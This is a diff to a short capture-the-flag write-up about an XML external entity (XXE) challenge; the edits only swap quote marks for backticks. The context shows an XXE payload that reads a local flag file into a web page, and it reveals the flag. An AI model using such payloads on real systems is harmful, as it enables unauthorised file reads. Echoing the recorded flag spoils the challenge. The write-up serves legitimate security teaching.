@@ -14,7 +14,7 @@
 
 ### In this file there are two important lines that get us the flag
 
-This one that sets ´bar´ with the path wich interest us
+This one that sets `bar` with the path wich interest us
 ``` XML
  <!ENTITY bar SYSTEM "file:///app/app/flag.txt" >]>
 ```
@@ -23,4 +23,4 @@ And this one, that gets the content on the file to show on the web page c:
 <nombre>&bar;</nombre>
 ``` 
 
-So... the content of the flag was: ´hackdef{d0_n0t_tru5t_xml_f1l3s}´
+So... the content of the flag was: `hackdef{d0_n0t_tru5t_xml_f1l3s}`
